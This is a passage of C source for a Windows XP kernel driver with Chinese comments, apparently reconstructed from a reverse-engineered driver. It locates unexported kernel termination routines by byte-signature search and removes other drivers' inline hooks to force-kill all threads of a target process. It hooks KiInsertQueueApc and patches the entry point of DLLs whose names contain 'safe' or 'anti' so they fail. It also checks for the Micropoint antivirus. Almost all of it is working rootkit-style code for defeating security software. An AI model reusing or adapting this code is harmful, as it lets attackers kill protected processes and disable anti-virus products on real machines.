		// 取得系统加载的模块信息 -- ntoskrnl is always first there
		//
		rc = ZwQuerySystemInformation (SystemModuleInformation, pModules, 4, &dwNeededSize);

		if (rc == STATUS_INFO_LENGTH_MISMATCH) {
			pModules = ExAllocatePool (PagedPool, dwNeededSize);
			RtlZeroMemory (pModules, dwNeededSize);

			rc = ZwQuerySystemInformation (SystemModuleInformation, pModules, dwNeededSize, NULL);
		} else {
			DbgPrint("ZwQuerySystemInformation  Error\n");
			goto End;
		}
		if (!NT_SUCCESS(rc)) {
			goto End;
		}

		ModuleBase = (DWORD)pModules->smi.Base;
		pKernelName = pModules->smi.ModuleNameOffset + pModules->smi.ImageName;

		//-------------------------------------------------------------------------------------
		// 从 HKLM\Software\Microsoft\Windows NT\CurrentVersion 中读取SystemRoot 的值.即系统目录
		// 偶机器XP SP2. 为"C:\WINDOWS"
		//
		ntStatus = RtlQueryRegistryValues (RTL_REGISTRY_WINDOWS_NT, L"", rqrtSystemRoot, NULL, NULL);
		if (ntStatus != STATUS_SUCCESS) {
			DbgPrint("RtlQueryRegistryValues  Error\n");
			goto End;
		}

		//
		// wSystemRoot即是保存着系统目录的数组的第0位指针.倒数第一位保存'\0',
		// 往后挪动 SystemRoot.Length - 2 长度,便是检查倒数第2位是否存在'\'.不存在则+上
		//
		if ( *(PWORD) ( (DWORD) wSystemRoot + SystemRoot.Length - 2 ) != '\\' ) {
			if ( !NT_SUCCESS ( RtlAppendUnicodeToString (&SystemRoot, L"\\") ) ) {
			}
		}

		// 在wFileName中包含 ntoskrnl.exe 的完整路径
		_snwprintf(
			wFileName,
			sizeof(wFileName),
			L"\\DosDevices\\%ssystem32\\%S",
			wSystemRoot,
			pKernelName
			);	

		DbgPrint("当前内核模块全路径 : %ws\n", wFileName);
		RtlInitUnicodeString (&FileName, wFileName);	
		InitializeObjectAttributes (&oa, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


		//-------------------------------------------------------------------------------------
		// 打开ntoskrnl.exe文件
		ntStatus = NtOpenFile(
			&ntFileHandle,
			GENERIC_READ | SYNCHRONIZE,
			&oa,
			&ioStatus,
			FILE_SHARE_READ,
			FILE_SYNCHRONOUS_IO_NONALERT
			);


		if (!NT_SUCCESS(ntStatus))
		{
			ntStatus = STATUS_UNSUCCESSFUL;
			DbgPrint("IoCreateFile  Error\n");
			goto End;
		}

		// IMAGE_DOS_HEADER
		// +0x3c e_lfanew
		byteOffset.LowPart = 0x3C; 
		byteOffset.HighPart = 0;

		// 打开文件后，读之
		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&NtHeadersOffset,  
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile  1 Error\n");
			goto End;
		}

		// NtHeadersOffset中保存的是PE头的偏移地址
		// IMAGE_OPTIONAL_HEADER
		// +0x010 AddressOfEntryPoint
		// 指向程序入口RVA地址
		byteOffset.LowPart = NtHeadersOffset + 0x28; 
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&AddressOfEntryPoint,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile  2 Error\n");
			goto End;
		}

		// IMAGE_OPTIONAL_HEADER
		// +0x038 SizeOfImage 
		// 内存中整个PE个映像尺寸
		byteOffset.LowPart = NtHeadersOffset + 0x50; 
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&SizeOfImage,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile 3 Error\n");
			goto End;
		}

		// IMAGE_OPTIONAL_HEADER
		// +0x01c ImageBase
		// 载入程序首选的RVA
		byteOffset.LowPart = NtHeadersOffset + 0x34;
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&ImageBase,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile 4 Error\n");
			goto End;
		}

		// 经过一系列的读PE后，得到一些偏移值。计算PE在内存中需要的空间。
		// 为其分配一个非分页内存
		// 将文件的内容都读取到这里
		// 获取文件的大小,申请一块内存来存放它
		//DbgPrint("获取文件的大小,申请一块内存来存放它\n");
		ZwQueryInformationFile (ntFileHandle, &ioStatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);

		FileContent =  ExAllocatePool (NonPagedPool, fsi.EndOfFile.LowPart);

		if (FileContent == NULL)
		{
			ntStatus = STATUS_UNSUCCESSFUL;
			ZwClose(ntFileHandle);

			DbgPrint("ExAllocatePool  Error\n");
			goto End;
		}

		byteOffset.LowPart = 0;
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			FileContent,
			fsi.EndOfFile.LowPart,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			ExFreePool(FileContent);

			DbgPrint("ZwReadFile 将要读的内容，读到一片非分页内存失败  Error\n");
			goto End;
		}

		if (fsi.EndOfFile.LowPart <= 0)
		{
			ntStatus = STATUS_NOT_FOUND;
			ZwClose(ntFileHandle);
			ExFreePool(FileContent);
			DbgPrint("NeedSize <= 0  Error\n");
			goto End;
		}

		GetHeaders (FileContent, &pfh, &poh, &psh);

		//DbgPrint("psh: %08lx\n", (PVOID)psh);

		//DbgPrint("start search....\n");
		// 开始搜索。。。 =.=!
		for (i = 0; i < fsi.EndOfFile.LowPart; i++)          
		{
			if ( (FileContent[i] == 0x8B) && (FileContent[i+1] == 0xFF) && (FileContent[i+2] == 0x55) && (FileContent[i+3] == 0x8B) &&
				(FileContent[i+4] == 0xEC) && (FileContent[i+5] == 0x83) && (FileContent[i+6] == 0xEC) && (FileContent[i+7] == 0x0C) &&
				(FileContent[i+8] == 0x83) && (FileContent[i+9] == 0x4D) && (FileContent[i+10] == 0xF8) && (FileContent[i+11] == 0xFF) &&
				(FileContent[i+12] == 0x56) && (FileContent[i+13] == 0x57) && (FileContent[i+14] == 0x8B) && (FileContent[i+15] == 0x7D) &&
				(FileContent[i+16] == 0x08) && (FileContent[i+17] == 0x8D) && (FileContent[i+18] == 0xB7) && (FileContent[i+19] == 0x48) &&
				(FileContent[i+20] == 0x02) && (FileContent[i+21] == 0x00) && (FileContent[i+22] == 0x00) && (FileContent[i+23] == 0xF6) &&
				(FileContent[i+24] == 0x06) && (FileContent[i+25] == 0x40) && (FileContent[i+26] == 0xC7) && (FileContent[i+27] == 0x45) &&
				(FileContent[i+28] == 0xF4) && (FileContent[i+29] == 0xC0) && (FileContent[i+30] == 0xBD) && (FileContent[i+31] == 0xF0) &&
				(FileContent[i+32] == 0xFF) && (FileContent[i+33] == 0x0F) && (FileContent[i+34] == 0x85)  )
			{
				//DbgPrint(" 进来了~\n");

				DbgPrint("文件偏移i:  %08lx\n", (PVOID)i);
				// 找到了
				sudami_1 = Offset2RVA( i, psh, pfh->NumberOfSections );

				//DbgPrint("RVA -- sudami_1 :  %08lx\n", (PVOID)sudami_1);

				if (sudami_1  == 0) {
					DbgPrint("sudami_1  == 0  Error\n");
					goto NotFound;
				}

				if (sudami_1  > SizeOfImage) {
					DbgPrint("sudami_1  > SizeOfImage  Error\n");
					goto NotFound;
				}

				sudami_1 += ModuleBase;

				if (!MmIsAddressValid((PVOID)sudami_1 )) {
					DbgPrint("!MmIsAddressValid((PVOID)sudami_1 )  Error\n");
					goto NotFound;
				}

				PspTerminateThreadByPointer = (PSPTERMINATETHREADBYPOINTER)sudami_1;

				DbgPrint( "PspTerminateThreadByPointer:\t0x%08x\n", (ULONG)PspTerminateThreadByPointer );
				break;
			}		
		}


		for (i = 0; i < fsi.EndOfFile.LowPart; i++)          
		{
			if ( (FileContent[i] == 0x8B) && (FileContent[i+1] == 0xFF) && (FileContent[i+2] == 0x55) && (FileContent[i+3] == 0x8B) &&
				(FileContent[i+4] == 0xEC) && (FileContent[i+5] == 0x83) && (FileContent[i+6] == 0xEC) && (FileContent[i+7] == 0x10) &&
				(FileContent[i+8] == 0x53) && (FileContent[i+9] == 0x56) && (FileContent[i+10] == 0x57) && (FileContent[i+11] == 0x64) &&
				(FileContent[i+12] == 0xA1) && (FileContent[i+13] == 0x24) && (FileContent[i+14] == 0x01) && (FileContent[i+15] == 0x00) &&
				(FileContent[i+16] == 0x00) && (FileContent[i+17] == 0x83) && (FileContent[i+18] == 0x7D) && (FileContent[i+19] == 0x08) &&
				(FileContent[i+20] == 0x00) && (FileContent[i+21] == 0x8B) && (FileContent[i+22] == 0xF8) && (FileContent[i+23] == 0x8B) &&
				(FileContent[i+24] == 0x47) && (FileContent[i+25] == 0x44) && (FileContent[i+26] == 0x89) && (FileContent[i+27] == 0x45) &&
				(FileContent[i+28] == 0xF0) && (FileContent[i+29] == 0x0F) && (FileContent[i+30] == 0x84) )
			{
				//DbgPrint(" 进来了~\n");

				DbgPrint("文件偏移i:  %08lx\n", (PVOID)i);
				// 找到了
				sudami_1 = Offset2RVA( i, psh, pfh->NumberOfSections );

				//DbgPrint("RVA -- sudami_1 :  %08lx\n", (PVOID)sudami_1);

				if (sudami_1  == 0) {
					DbgPrint("sudami_1  == 0  Error\n");
					goto NotFound;
				}

				if (sudami_1  > SizeOfImage) {
					DbgPrint("sudami_1  > SizeOfImage  Error\n");
					goto NotFound;
				}

				sudami_1 += ModuleBase;

				if (!MmIsAddressValid((PVOID)sudami_1 )) {
					DbgPrint("!MmIsAddressValid((PVOID)sudami_1 )  Error\n");
					goto NotFound;
				}

				NtTerminateProcess = (PUCHAR)sudami_1;
				DbgPrint( "NtTerminateProcess:\t0x%08x\n", (ULONG)NtTerminateProcess );

				ExFreePool(FileContent);
				ZwClose(ntFileHandle);

				goto End;
			}	

		}

NotFound:

		DbgPrint("找了半天没找到，应该是特征没找准~~~\n");
		ntStatus = STATUS_NOT_FOUND;
		ZwClose(ntFileHandle);
		ExFreePool(FileContent);

	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

End:
	PsTerminateSystemThread(STATUS_SUCCESS);
	return;
}

//
// 下面是设置线程为系统标志,以便关闭方便
//
ULONG GetThreadFlagsOffset()
{
	PUCHAR addr;
	PUCHAR p;
	ULONG Offset;

	addr = (PUCHAR) GetFunctionAddr( L"PsTerminateSystemThread" );
	for (p=addr;p<addr+PAGE_SIZE;p++)
	{
		if ( *(PUSHORT)p == 0x80F6 )
		{
			Offset=*(PULONG)(p+2);
			return Offset;
		}
	}
}


//
// 恢复KeInsertQueueApc的inline hook
//
VOID XPRestoreKeInsertQueueApc ()
{
	PUCHAR addr;
	KIRQL  oldIrql;

	addr = (PUCHAR) GetFunctionAddr( L"KeInsertQueueApc" );

	// 禁止系统写保护，提升IRQL到DPC，然后恢复KeInsertQueueApc的Inline Hook
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	// 恢复KeInsertQueueApc的前9字节
	RtlCopyMemory ( (BYTE*)addr, KeInsertQueueApc_orig_code, 9 );

	KeLowerIrql(oldIrql);

	WPON();

	//DbgPrint("XPRestoreKeInsertQueueApc Success\n");
}

//
// 恢复KiInsertQueueApc的inline hook
//
VOID XPRestoreKiInsertQueueApc ()
{
	KIRQL  oldIrql;

	if(  NULL == KiInsertQueueApc ) {
		return;
	}


	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, KiInsertQueueApc_orig_code, 11 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestoreKiInsertQueueApc Success\n");
}

//
// 恢复PspTerminateThreadByPointer的inline hook
//
VOID XPRestorePspTerminateThreadByPointer ()
{
	KIRQL  oldIrql;

	if(  NULL == PspTerminateThreadByPointer ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)PspTerminateThreadByPointer, PspTerminateThreadByPointer_orig_code, 8 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestorePspTerminateThreadByPointer Success\n");
}

//
// 恢复NtTerminateProcess的inline hook
//
VOID XPRestoreNtTerminateProcess ()
{
	KIRQL  oldIrql;

	if(  NULL == NtTerminateProcess ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)NtTerminateProcess, PspTerminateThreadByPointer_orig_code, 5 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestoreNtTerminateProcess Success\n");
}


//
// 恢复 PsGetNextProcessThread 的inline hook
//
VOID XPRestorePsGetNextProcessThread  ()
{
	KIRQL  oldIrql;

	if(  NULL == g_PsGetNextProcessThread ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)g_PsGetNextProcessThread, PspTerminateThreadByPointer_orig_code, 5 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestorePsGetNextProcessThread  Success\n");
}

//
//
//
NTSTATUS
My_TerminateProc (
				  PEPROCESS Process,
				  NTSTATUS ExitStatus
				  )
				  /*++

				  Author: sudami  08/03/14

				  参数:
				  Process - 要结束的进程的EPROCESS

				  ExitStatus - 退出状态

				  功能:
				  实现从NtTerminateProcess-->PspTerminateThreadByPointer-->
				  KeInsertQueueApc-->PspExitThread的功能

				  --*/
{
	PLIST_ENTRY ListEntry;
	PETHREAD NewThread, CurrentThread;
	PETHREAD Thread;
	NTSTATUS st;
	ULONG ThreadFlagsOffset;
	ULONG    OldMask;
	PULONG ThreadFlags, CrossThreadFlags;
	PKAPC    ExitApc=NULL;
	LARGE_INTEGER ShortTime = {(ULONG)(-10 * 1000 * 100), -1}; // 100 milliseconds
	int i = 0;

	//g_PsGetNextProcessThread = (My_PsGetNextProcessThread)0x8057b3b9;

	ThreadFlagsOffset = GetThreadFlagsOffset();

	i++;

	if ( Process == NULL) {
		if ( 1 == i ) {
			DbgPrint("My_TerminateProc的参数1无效 --> Process == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	if ( g_PsGetNextProcessThread == NULL) {
		if ( 1 == i ) {
			DbgPrint("g_PsGetNextProcessThread == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	if ( PspTerminateThreadByPointer == NULL) {
		if ( 1 == i ) {
			DbgPrint("PspTerminateThreadByPointer == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	// 先恢复再调用

	XPRestoreKeInsertQueueApc ();
	XPRestoreKiInsertQueueApc ();
	XPRestorePspTerminateThreadByPointer ();
	XPRestoreNtTerminateProcess ();
	XPRestorePsGetNextProcessThread  ();

	for (Thread = g_PsGetNextProcessThread(Process, NULL);
		Thread != NULL;
		Thread =  g_PsGetNextProcessThread(Process, Thread)) {

			st = STATUS_SUCCESS;
			if (Thread != PsGetCurrentThread()) {

				PspTerminateThreadByPointer( Thread, 0 );
			}
	}

	return st;
}




ULONG
RVA2Offset (
			ULONG RVA, 
			PIMAGE_SECTION_HEADER pSectionHeader, 
			ULONG Sections
			)
{    
	ULONG i;

	if(RVA < pSectionHeader[0].PointerToRawData)
		return RVA;

	for(i = 0; i < Sections; i++)
	{   
		if(RVA >= pSectionHeader[i].VirtualAddress &&
			RVA < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)           
			return (RVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData);
	}

	return 0;
}


ULONG 
Offset2RVA (
			ULONG Offset, 
			PIMAGE_SECTION_HEADER pSectionHeader, 
			ULONG Sections
			)
{   
	ULONG i;

	if(Offset < pSectionHeader[0].PointerToRawData)
		return Offset;

	for(i = 0; i < Sections; i++)
	{
		if(Offset >= pSectionHeader[i].PointerToRawData &&
			Offset < pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
			return (Offset - pSectionHeader[i].PointerToRawData + pSectionHeader[i].VirtualAddress);
	}

	return 0;
}

//
// 停止inline hook
//
VOID UnHookKiInsertQueueApc ()
{
	KIRQL  oldIrql;

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, g_OrigCode, 5 );

	KeLowerIrql(oldIrql);
	WPON();

	g_bHooked = FALSE;
}


//
// 开始inline hook --  KiInsertQueueApc
//
VOID HookKiInsertQueueApc ()
{ 
	KIRQL  oldIrql;

	if ( KiInsertQueueApc == NULL) {
		DbgPrint("KiInsertQueueApc == NULL\n");
		return;
	}

	//DbgPrint("开始inline hook --  KiInsertQueueApc\n");
	DbgPrint( "KiInsertQueueApc的地址:\t0x%08x\n", (ULONG)KiInsertQueueApc );
	// 保存原函数的前5字节内容
	RtlCopyMemory (g_OrigCode, (BYTE*)KiInsertQueueApc, 5);
	*( (ULONG*)(g_HookCode + 1) ) = (ULONG)fake_KiInsertQueueApc - (ULONG)KiInsertQueueApc - 5;


	// 禁止系统写保护，提升IRQL到DPC
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();


	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, g_HookCode, 5 );
	*( (ULONG*)(jmp_orig_code + 1) ) = (ULONG) ( (BYTE*)KiInsertQueueApc + 5 );

	RtlCopyMemory ( (BYTE*)Proxy_KiInsertQueueApc, g_OrigCode, 5);
	RtlCopyMemory ( (BYTE*)Proxy_KiInsertQueueApc + 5, jmp_orig_code, 7);

	// 恢复写保护，降低IRQL
	KeLowerIrql(oldIrql);
	WPON();

	g_bHooked = TRUE;


}

//
// 跳转到我们的函数里面进行预处理
//
VOID
fake_KiInsertQueueApc (
					   PKAPC Apc,
					   KPRIORITY Increment
					   )
{
	// 预处理

	DbgPrint("inline hook --  KiInsertQueueApc 成功\n");
	Proxy_KiInsertQueueApc( Apc, Increment );
}

//
// 代理函数，负责跳转到原函数中继续执行
//
__declspec (naked) 
VOID
Proxy_KiInsertQueueApc (
						PKAPC Apc,
						KPRIORITY Increment
						)
{
	__asm {  // 共12字节
		_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90  // 前5字节实现原函数的头5字节功能
			_emit 0x90  // 这个填充jmp
			_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90  // 这4字节保存原函数+5处的地址
			_emit 0x90  
			_emit 0x90  // 因为是长转移,所以必须是 0x0080
	}
}


//
//
//
VOID
MyLoadImageRoutine(
				   IN PUNICODE_STRING ImageName,
				   IN HANDLE ProcessId,
				   IN PIMAGE_INFO ImageInfo
				   )
				   /*++

				   逆向: sudami  08/03/05

				   功能:
				   在这个模块通知回调函数中进行过滤。若是病毒DLL加载,则修改其DLL的前5字节
				   使其直接失效.

				   --*/
{
	BOOL  bFind;
	ULONG Length;
	WCHAR Name[300];
	PEPROCESS   proc;
	PVOID       pImageBase;
	SIZE_T      dwSize;
	PVOID       pOEP;
	KIRQL       oldIrql;
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nth;
	PIMAGE_OPTIONAL_HEADER  poh;
	PHYSICAL_ADDRESS physicalAddress;

	if (ImageName == NULL) {
		return;
	}

	Length = ImageName->Length;
	if ((Length == 0) || (ImageName->Buffer == NULL)) {
		return;
	}

	bFind = FALSE;
	RtlCopyMemory(Name , ImageName->Buffer, ImageName->MaximumLength );
	_wcsupr(Name);

	// 
	// 原IDB中申明了一个结构体（全局变量），其中每个DLL名字后面紧跟着的是一个1到3的数字。
	//			0表明是在 SYSTEM32 目录下
	//			1表明是在 WINDOWS目录下
	//			2表明是在 COMMON FILES目录下
	//			3表明无论在哪都是病毒的DLL
	// 偶这里简化了一下，效果一样
	//				-- sudami 08/03/08                  
	//
	if ( ( (wcsstr( Name, L"DLLWM.DLL" ) != NULL) && (wcsstr( Name, L"SYSTEM32" ) != NULL) ) || 
		( (wcsstr( Name, L"WININFO.RXK" ) != NULL) && (wcsstr( Name, L"COMMON FILES" ) != NULL) ) || 
		( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINDOWS" ) != NULL) ) || 
		( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINNT" ) != NULL) ) || 
		(wcsstr( Name, L"WINDHCP.DLL" ) != NULL) || 
		(wcsstr( Name, L"DLLHOSTS.DLL" ) != NULL) || 
		(wcsstr( Name, L"NOTEPAD.DLL" ) != NULL) || 
		(wcsstr( Name, L"RPCS.DLL" ) != NULL) || 
		(wcsstr( Name, L"RDSHOST.DLL" ) != NULL) || 
		(wcsstr( Name, L"LGSYM.DLL" ) != NULL) || 
		(wcsstr( Name, L"RUND11.DLL" ) != NULL) || 
		(wcsstr( Name, L"MDDDSCCRT.DLL" ) != NULL) || 
		(wcsstr( Name, L"WSVBS.DLL" ) != NULL) || 
		(wcsstr( Name, L"CMDBCS.DLL" ) != NULL) || 
		(wcsstr( Name, L"UPXDHND.DLL" ) != NULL) || 
		(wcsstr( Name, L"RDFHOST.DLL" ) != NULL) ||
		(wcsstr( Name, L"safe" ) != NULL) ||
		(wcsstr( Name, L"anti" ) != NULL) ) {
			bFind = TRUE;
	}

	if ( bFind == FALSE ) {
		return;
	}

	if( !NT_SUCCESS(PsLookupProcessByProcessId( ProcessId, &proc )) ) {
		return;
	}

	KeAttachProcess (proc); // 附着到此进程

	pImageBase = ImageInfo->ImageBase;
	dwSize     = ImageInfo->ImageSize;

	try { // 确保地址的正确性
		ProbeForRead( pImageBase, dwSize, sizeof(UCHAR));
	} except(EXCEPTION_EXECUTE_HANDLER) {
		return;
	}

	// 得到程序入口地址
	dos     = (PIMAGE_DOS_HEADER) pImageBase;
	nth     = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (char *)pImageBase);
	poh     = (PIMAGE_OPTIONAL_HEADER) &nth->OptionalHeader;

	if( (dos->e_magic != 0x5a4d) || (nth->Signature != 0x00004550) ) {// "MZ" "PE\0\0"
		return;
	}

	pOEP = (PVOID)( poh->AddressOfEntryPoint + (char *)pImageBase );
	physicalAddress = MmGetPhysicalAddress( pOEP );

	ProbeForWrite ( pOEP, 5, sizeof(CHAR));

	// 修改其前5字节的内容,使其失效
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	RtlCopyMemory ( (BYTE*)pOEP, g_Code, 5 );

	KeLowerIrql(oldIrql);
	WPON();

	KeDetachProcess();
}

BOOL IsMPExist()
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	OBJECT_ATTRIBUTES   objectAttributes;
	WCHAR			Buffer[128] = L"\\REGISTRY\\MACHINE\\SOFTWARE\\Micropoint";
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative

	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	status = ZwOpenKey(
		&KeyHandle,
		KEY_READ | KEY_WRITE,
		&objectAttributes
		);

	if (NT_SUCCESS(status)) { //存在
		DbgPrint("IsMPExist() -- 微点存在\n");
		g_bMP = TRUE;
		return TRUE;
	}

	DbgPrint("IsMPExist() -- 微点不存在\n");
	return FALSE;
}

////////////////////////////////////----- END OF FILE ------////////////////////////////////////////////